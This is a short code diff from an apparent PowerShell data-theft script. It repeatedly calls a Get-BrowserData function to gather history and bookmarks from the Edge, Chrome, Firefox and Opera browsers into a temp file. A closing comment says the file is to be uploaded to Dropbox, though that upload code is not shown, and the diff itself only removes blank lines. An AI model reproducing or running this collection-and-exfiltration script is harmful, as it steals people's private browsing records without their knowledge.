@@ -30,17 +30,11 @@ function Get-BrowserData {
 }
 
 Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\--BrowserData.txt
-
 Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
-
 Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\--BrowserData.txt
-
 Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
-
 Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\--BrowserData.txt
-
 Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.txt
-
 Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
 
 # Upload output file to dropbox
